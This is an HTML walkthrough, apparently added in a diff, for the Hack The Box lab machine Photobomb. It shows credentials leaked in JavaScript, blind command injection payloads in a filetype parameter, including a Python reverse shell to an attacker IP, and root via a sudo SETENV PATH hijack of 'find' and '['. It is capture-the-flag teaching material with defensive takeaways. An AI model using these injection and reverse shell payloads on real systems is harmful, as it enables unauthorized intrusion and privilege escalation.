@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Photobomb — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">📸</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='photobomb'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-pb','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-pb')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Photobomb</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">JS hardcoded creds → blind cmd injection</span><span class="chain-arrow">→</span><span class="chain-node blue">wizard shell + user flag</span><span class="chain-arrow">→</span><span class="chain-node red">sudo SETENV + PATH hijack find (or [) → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.228.60</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    nginx 1.18.0
+|_http-title: Photobomb</span></code></pre>
+
+<p>The main page links to <code>/printer</code> (401 — Basic Auth). Directory enumeration confirms no other endpoints.</p>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>JavaScript Credential Leak → Blind Command Injection</h2></div>
+
+<h3>Hardcoded Credentials in JS</h3>
+<p>View source reveals <code>photobomb.js</code>:</p>
+<pre><code><span class="output">function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them
+  if (document.cookie.match(/isPhotoBombTechSupport/)) {
+    document.getElementsByClassName('creds')[0]
+      .setAttribute('href',
+        'http://<span class="highlight">pH0t0:b0Mb!</span>@photobomb.htb/printer');
+  }
+}</span></code></pre>
+
+<p>Access <code>http://pH0t0:b0Mb!@photobomb.htb/printer</code> — an image download/conversion tool with parameters: <code>photo</code>, <code>filetype</code>, <code>dimensions</code>.</p>
+
+<h3>Blind Command Injection in filetype</h3>
+<p>The <code>filetype</code> parameter is concatenated into a shell command for image conversion. No output is returned — blind injection. Confirm with <code>ping</code>:</p>
+
+<pre><code><span class="cmd">POST /printer HTTP/1.1
+Host: photobomb.htb
+Authorization: Basic cEgwdDA6YjBNYiE=
+Content-Type: application/x-www-form-urlencoded</span>
+
+<span class="output">photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&<span class="highlight">filetype=png;ping${IFS}-c${IFS}1${IFS}10.10.15.65</span>&dimensions=30x20</span></code></pre>
+
+<pre><code><span class="cmd">$ sudo tcpdump -i tun0 icmp</span>
+<span class="output">ICMP echo request from 10.129.228.60 → confirmed!</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">${IFS} replaces spaces</span>
+<code>${IFS}</code> is bash's Internal Field Separator (defaults to space/tab/newline). When the server strips or mishandles literal spaces, <code>${IFS}</code> provides a working substitute that bash expands to a space at runtime.
+</div>
+
+<h3>Reverse Shell</h3>
+<pre><code><span class="comment"># Python reverse shell payload in filetype parameter (URL-encoded):</span>
+<span class="output">filetype=png;export${IFS}RHOST="10.10.15.65";export${IFS}RPORT=5555;python3${IFS}-c${IFS}'import${IFS}sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)${IFS}for${IFS}fd${IFS}in${IFS}(0,1,2)];pty.spawn("sh")'</span>
+
+<span class="cmd">$ nc -lnvp 5555</span>
+<span class="output">wizard@photobomb:~$ cat user.txt
+1f61d44b8596c19fae06282eb9136b66</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 2</div><h2>Privilege Escalation — sudo SETENV + PATH Hijack</h2></div>
+
+<h3>Sudo Enumeration</h3>
+<pre><code><span class="cmd">wizard@photobomb:~$ sudo -l</span>
+<span class="output">(root) <span class="highlight">SETENV</span>: NOPASSWD: /opt/cleanup.sh</span></code></pre>
+
+<h3>Analyzing the Script</h3>
+<pre><code><span class="cmd">wizard@photobomb:~$ cat /opt/cleanup.sh</span>
+<span class="output">#!/bin/bash
+. /opt/.bashrc              <span class="comment"># ← sources a custom bashrc (see bonus)</span>
+cd /home/wizard/photobomb
+
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+<span class="important">find</span> source_images -type f -name '*.jpg' -exec chown root:root {} \;</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">SETENV + relative path = PATH hijack</span>
+<code>SETENV</code> means we can pass environment variables to the sudo command — including <code>PATH</code>. The script calls <code>find</code> without an absolute path (<code>/usr/bin/find</code>). By prepending a directory we control to <code>PATH</code> and placing a malicious <code>find</code> there, our script executes as root instead of the real <code>find</code>.
+</div>
+
+<h3>Exploit — Hijack find</h3>
+<pre><code><span class="cmd">wizard@photobomb:~$ cd /tmp
+wizard@photobomb:/tmp$ echo bash > find
+wizard@photobomb:/tmp$ chmod 777 find
+wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh</span>
+
+<span class="output">root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+d81ba2c9bd65e619ab5a3bca7e2b30a5</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Bonus</div><h2>The Hidden Twin — Hijacking <code>[</code></h2></div>
+
+<p>Most writeups stop at <code>find</code>, but this machine hides a <strong>second identical hijack path</strong> that most people miss.</p>
+
+<div class="callout callout-key">
+<span class="callout-label">[ is a command, not syntax</span>
+In <code>if [ -s file ]</code>, the <code>[</code> is a real command — identical to <code>test</code>. It exists both as a <strong>bash builtin</strong> (loaded with the shell, doesn't check PATH) and as an <strong>external binary</strong> at <code>/usr/bin/[</code>. Normally the builtin wins. But the script sources <code>/opt/.bashrc</code>, which contains:
+</div>
+
+<pre><code><span class="comment"># /opt/.bashrc contains:</span>
+<span class="important">enable -n [</span>    <span class="comment"># disables the [ builtin!</span></code></pre>
+
+<p><code>enable -n [</code> disables the builtin <code>[</code>. Now when the script hits <code>if [ -s ... ]</code>, bash can't find <code>[</code> internally and is forced to search <code>PATH</code> for an external <code>[</code> binary — creating the exact same hijack condition as <code>find</code>.</p>
+
+<pre><code><span class="cmd">wizard@photobomb:/tmp$ echo bash > '['
+wizard@photobomb:/tmp$ chmod 777 '['
+wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh</span>
+
+<span class="output">root@photobomb:/home/wizard/photobomb#</span>  <span class="comment">← root shell via [</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">The difference between the two paths</span>
+Hijacking <code>find</code> works because the script uses a relative path — it's the script's own flaw. Hijacking <code>[</code> works because <code>/opt/.bashrc</code> disables the builtin with <code>enable -n</code> — it's an external configuration flaw. On a machine without that <code>enable -n [</code> line, only the <code>find</code> path works.
+</div>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Never hardcode credentials in frontend JavaScript.</strong><p><code>photobomb.js</code> had Basic Auth credentials in plain text. View Source is all it takes. Move authentication to server-side.</p></div>
+<div class="takeaway-item"><strong>Blind command injection is confirmed with ping/tcpdump.</strong><p>No output? No problem. <code>;ping${IFS}-c${IFS}1${IFS}ATTACKER</code> + <code>tcpdump -i tun0 icmp</code> confirms execution without needing response output.</p></div>
+<div class="takeaway-item"><strong>sudo SETENV is as dangerous as NOPASSWD.</strong><p>It lets attackers inject <code>PATH</code>, <code>LD_PRELOAD</code>, and other environment variables. Combined with scripts using relative paths, it's instant root.</p></div>
+<div class="takeaway-item"><strong><code>[</code> is a command, not punctuation.</strong><p>It's both a bash builtin and an external binary. <code>enable -n [</code> forces bash to search PATH for it — opening the same hijack vector as any other relative-path binary. Privileged scripts should never source untrusted bashrc files.</p></div>
+<div class="takeaway-item"><strong>One script can have multiple independent vulnerabilities.</strong><p>The <code>find</code> relative path and the <code>[</code> builtin disable are two completely separate flaws with the same exploitation technique. Always look for more than one way in.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">JS creds</span><span class="arrow">→</span><span class="node node-green">blind cmd inject</span><span class="arrow">→</span><span class="node node-blue">wizard shell</span><span class="arrow">→</span><span class="node node-red">SETENV PATH hijack (find or [) → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Photobomb Writeup · 2026</footer>
+</body></html>
